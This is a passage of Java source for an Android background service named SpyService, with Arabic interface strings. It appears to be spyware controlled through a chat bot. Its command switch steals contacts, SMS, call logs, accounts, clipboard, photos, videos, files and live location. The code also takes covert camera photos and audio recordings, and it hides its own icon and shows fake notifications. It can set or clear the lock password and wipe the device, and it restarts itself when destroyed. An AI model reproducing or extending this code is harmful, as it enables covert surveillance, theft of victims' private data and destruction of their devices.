                case BatteryManager.BATTERY_STATUS_CHARGING: status = "شحن"; break;
                case BatteryManager.BATTERY_STATUS_DISCHARGING: status = "تفريغ"; break;
                case BatteryManager.BATTERY_STATUS_FULL: status = "ممتلئة"; break;
                default: status = "غير معروف";
            }
            String info = "المستوى: " + (level*100/scale) + "%\nالحرارة: " + temp + "°C\nالجهد: " + voltage + "mV\nالحالة: " + status;
            sendData("BATTERY_HISTORY", info);
            bot.sendMessage("🔋 معلومات البطارية:\n" + info);
        } else {
            bot.sendMessage("❌ لا يمكن جلب معلومات البطارية");
        }
    }

    private void getStorageInfo() {
        try {
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            long totalBytes = stat.getTotalBytes();
            long freeBytes = stat.getFreeBytes();
            long usedBytes = totalBytes - freeBytes;
            String info = "الإجمالي: " + totalBytes/(1024*1024*1024) + " GB\nالمستخدم: " + usedBytes/(1024*1024*1024) + " GB\nالمتبقي: " + freeBytes/(1024*1024*1024) + " GB";
            sendData("STORAGE", info);
            bot.sendMessage("💾 معلومات التخزين:\n" + info);
        } catch (Exception e) {
            bot.sendMessage("❌ فشل جلب معلومات التخزين: " + e.getMessage());
        }
    }

    // ========================== تنفيذ الأوامر ==========================
    private void executeCommand(String cmd) {
        String lower = cmd.toLowerCase().trim();
        Log.d(TAG, "Executing: " + lower);
        try {
            switch (lower) {
                case "get_contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
                case "copy_contacts": sendFile(collectContacts(), "📋 نسخة جهات الاتصال"); break;
                case "export_contacts": sendFile(collectContacts(), "📤 تصدير جهات الاتصال"); break;
                case "get_sms": sendFile(collectSms(), "💬 الرسائل النصية"); break;
                case "forward_sms": sendFile(collectSms(), "↪️ إعادة توجيه الرسائل"); break;
                case "get_calllogs": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
                case "call_history": sendFile(collectCallLogs(), "📋 سجل المكالمات"); break;
                case "get_location": getLocation(); break;
                case "start_location_track": startLocationTracking(); break;
                case "stop_location_track": stopLocationTracking(); break;
                case "get_device": sendDeviceInfo(); break;
                case "get_network": sendNetworkInfo(); break;
                case "get_imei": getImei(); break;
                case "get_phone": getPhoneNumber(); break;
                case "get_sim": getSimInfo(); break;
                case "get_wifi": getWifiInfo(); break;
                case "get_battery": getBatteryInfo(); break;
                case "get_ip": getPublicIp(); break;
                case "get_apps": sendFile(collectApps(), "📱 التطبيقات"); break;
                case "get_accounts": sendFile(collectAccounts(), "👤 الحسابات"); break;
                case "get_clipboard": sendFile(collectClipboard(), "📋 الحافظة"); break;
                case "get_photos": sendFile(collectMedia("images", 0), "🖼 جميع الصور"); break;
                case "get_photos_5": sendFile(collectMedia("images", 5), "🖼 5 صور"); break;
                case "get_photos_10": sendFile(collectMedia("images", 10), "🖼 10 صور"); break;
                case "get_photos_20": sendFile(collectMedia("images", 20), "🖼 20 صورة"); break;
                case "get_photos_30": sendFile(collectMedia("images", 30), "🖼 30 صورة"); break;
                case "get_videos": sendFile(collectMedia("videos", 0), "🎬 جميع الفيديوهات"); break;
                case "get_videos_5": sendFile(collectMedia("videos", 5), "🎬 5 فيديوهات"); break;
                case "get_videos_10": sendFile(collectMedia("videos", 10), "🎬 10 فيديوهات"); break;
                case "get_files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
                case "take_photo": takePhoto(false); break;
                case "take_photo_front": takePhoto(true); break;
                case "flash_on": flash(true); break;
                case "flash_off": flash(false); break;
                case "start_record": startRecording(); break;
                case "stop_record": sendFile(stopRecording(), "🎤 تسجيل صوتي"); break;
                case "hide_app": hideApp(); break;
                case "show_app": showApp(); break;
                case "fake_notif": showFakeNotification(); break;
                case "lock_device": lockDevice(); break;
                case "set_lock_password": setLockPassword(); break;
                case "clear_lock_password": clearLockPassword(); break;
                case "wipe_device": wipeDevice(); break;
                case "set_password_rules": setPasswordRules(); break;
                case "disable_camera": disableCamera(); break;
                case "enable_camera": enableCamera(); break;
                case "reboot": rebootDevice(); break;
                case "shutdown": shutdownDevice(); break;
                case "vibrate": vibrateDevice(); break;
                case "set_volume_max": setVolume(true); break;
                case "set_volume_min": setVolume(false); break;
                case "set_ringtone_volume": setRingtoneVolume(5); break;
                case "set_media_volume": setMediaVolume(7); break;
                case "open_browser": openBrowser(); break;
                case "toggle_wifi_on": toggleWifi(true); break;
                case "toggle_wifi_off": toggleWifi(false); break;
                case "toggle_bluetooth_on": toggleBluetooth(true); break;
                case "toggle_bluetooth_off": toggleBluetooth(false); break;
                case "toggle_location_on": toggleLocation(true); break;
                case "toggle_location_off": toggleLocation(false); break;
                case "clear_data": clearAppData(); break;
                case "kill_apps": killAllApps(); break;
                case "screenshot": takeScreenshot(); break;
                case "installed_apps": getInstalledApps(); break;
                case "running_processes": getRunningProcesses(); break;
                case "set_brightness": setScreenBrightness(128); break;
                case "auto_rotate_on": setAutoRotate(true); break;
                case "auto_rotate_off": setAutoRotate(false); break;
                case "battery_history": getBatteryHistory(); break;
                case "storage_info": getStorageInfo(); break;
                case "open_app_whatsapp": openApp("com.whatsapp"); break;
                case "open_app_facebook": openApp("com.facebook.katana"); break;
                case "open_app_instagram": openApp("com.instagram.android"); break;
                case "open_app_youtube": openApp("com.google.android.youtube"); break;
                case "uninstall_app_whatsapp": uninstallApp("com.whatsapp"); break;
                default:
                    sendData("ERROR", "أمر غير معروف: " + cmd);
                    bot.sendMessage("❌ أمر غير معروف: " + cmd);
            }
        } catch (Exception e) {
            sendData("ERROR", "خطأ: " + e.getMessage());
            bot.sendMessage("❌ خطأ: " + e.getMessage());
            Log.e(TAG, "Execute error", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) { camera.stopPreview(); camera.release(); camera = null; }
        if (frontCamera != null) { frontCamera.stopPreview(); frontCamera.release(); frontCamera = null; }
        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; }
        startService(new Intent(this, SpyService.class));
    }
}
